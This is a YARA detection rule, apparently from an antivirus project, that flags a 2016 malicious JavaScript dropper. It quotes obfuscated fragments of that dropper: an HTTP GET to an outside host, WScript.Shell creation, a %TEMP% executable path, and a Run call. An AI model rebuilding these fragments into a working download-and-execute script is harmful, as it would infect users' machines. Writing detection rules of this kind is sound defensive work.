rule sig_20160330_c5e9d376960fb910caa49808087d9039 {
  meta:
    description = "datamaliciousorder - file 20160330_c5e9d376960fb910caa49808087d9039.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9fe3a6d9437c3bf9072682b4c6e17cf0ce00d4c39c5a001fd8bce534e5a79479"

  strings:
    $s1  = "_WM[_N](\"GET\", \"http://itead-europe.com/k3ias\", false);" fullword ascii
    $s2  = "var _YO = function _DY() {return WScript[_LY](\"WScript\"+\".Shell\");}(), _U0 = 11;" fullword ascii
    $s3  = "function _QI(_AE, _RJ){_LK = _LK * 1; return _AE - _RJ;};" fullword ascii
    $s4  = "if (_WM[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _BK() {return _YO[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"YfTWL0yg.ex\" + \"e\";};" fullword ascii
    $s6  = "function _V(){return _GC + \"\";};" fullword ascii
    $s7  = "function _S() {return ((_P == true) && (_P == _BG)) ? 1 : _LK;};" fullword ascii
    $s8  = "function _DB(_UE){_YO[\"Run\"](_UE, _LK, _LK);};" fullword ascii
    $s9  = "function _O(){return 22;};" fullword ascii
    $s10 = "var _KD = new this[\"Date\"]();" fullword ascii
    $s11 = "function _DE()" fullword ascii
    $s12 = "return _QI(_G0, _KE);" fullword ascii
    $s13 = " while (_U){" fullword ascii
    $s14 = "function _Z(_K) {var _XU = (1, 2, 3, 4, 5, _K); return _XU;};" fullword ascii
    $s15 = "function _IQ(){return _LY;};" fullword ascii
    $s16 = "var _GK = false;" fullword ascii
    $s17 = "var _P = false;" fullword ascii
    $s18 = "_P = true; " fullword ascii
    $s19 = "_BG = true; " fullword ascii
    $s20 = "var _BG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}